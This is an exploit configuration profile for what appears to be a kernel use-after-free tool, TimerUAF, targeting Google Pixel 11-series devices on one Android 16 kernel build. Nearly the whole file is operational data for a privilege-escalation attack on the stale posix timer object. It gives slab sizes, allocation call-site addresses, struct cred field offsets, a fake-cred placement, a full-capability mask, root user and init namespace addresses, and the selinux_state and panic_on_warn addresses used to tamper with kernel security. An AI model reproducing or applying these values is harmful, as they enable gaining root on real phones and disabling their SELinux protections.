# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Google Pixel 11 / 11 Pro / 11 Pro XL / 11 Pro Fold
#         (cubs / grizzly / kodiak / yogi)
# Build : CD1A.261005.003 and CD1A.261005.003.b1
# Kernel: 6.12.69-android16-6-g70777328ed0e-ab16108597-4k (4K pages)
#
# All four factory images (and both build suffixes) carry a byte-identical
# kernel payload:
#   sha256 4417511834260f72c1b6a5bb9b9f809dfb6734b20fd7e8aa156c3c1f91f0f97b
# so one profile covers them.  Every constant below comes from that image:
#   timer_site          do_timer_create: bl kmem_cache_alloc_noprof at
#                       +0x90, returns to +0x94 (x0 = posix_timers_cache)
#   copy_process_low21  copy_process: bl kmem_cache_alloc_node_noprof at
#                       +0x140, returns to +0x144 (x0 = task_struct_cachep)
#   selinux_state       kallsyms, struct base; BTF puts `enforcing` at +0
#   arch_task_struct_size = 5184 (sizeof task_struct) + 784 from
#                       android_arch_task_struct_size=784 in vendor_boot,
#                       hence the 0x1750 task_struct cache object size
#
# Vulnerability: fs/exec.c begin_new_exec() still calls
# posix_cpu_timers_exit() before exit_itimers(), i.e. the cleanup that
# 6.12.112 moved ahead of de_thread() has not been backported here.
release = "6.12.69-android16-6-g70777328ed0e-ab16108597-4k"
schema_version = 1
ksu_kmi = "android16-6.12"

page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# do_timer_create -> kmem_cache_alloc_noprof(posix_timers_cache) call site.
#   ffffffc0803634fc: bl kmem_cache_alloc_noprof
#   return address = ffffffc080363500
timer_site = 0xffffffc080363500
timer_alloc = 0x100

# cred_jar: sizeof(struct cred)=0xb8, slab object=0xc0.
# cred_init: mov w1,#0xb8 / SLAB_HWCACHE_ALIGN -> ALIGN(0xb8,64)=0xc0
cred_req = 0xb8
cred_alloc = 0xc0
cred_size = 0xb8
# cred is `atomic_long_t usage` (8 bytes), so uid is at +0x8.
cred_uid_off = 0x8
cred_euid_off = 0x18
cred_cap_off = 0x30
cred_cap_count = 5
cred_security_off = 0x80
cred_user_off = 0x88
cred_userns_off = 0x90
cred_ucounts_off = 0x98
cred_group_off = 0xa0
# Distance from the stale k_itimer rb_node to the fake cred base.
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffffc082887890
panic_on_warn = 0xffffffc0825dade0

# task_struct / cred layout (BTF)
task_cred_off = 0x900
copy_process_low21 = 0xe7f7c
# 0x1440 (BTF sizeof task_struct) + 0x310 (bootconfig vendor extension)
task_alloc_bytes = 0x1750

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc082602170
init_user_ns = 0xffffffc082601ef8
init_ucounts = 0xffffffc082603b08
init_groups = 0xffffffc082603638

# task_security_struct
# LSM order is "landlock,...,safesetid,selinux,...,bpf" with capability
# first, so the aggregate cred blob is landlock[0x0..0x8) then selinux[0x8..).
selinux_blob_off = 0x8
selinux_sid_kernel = 1
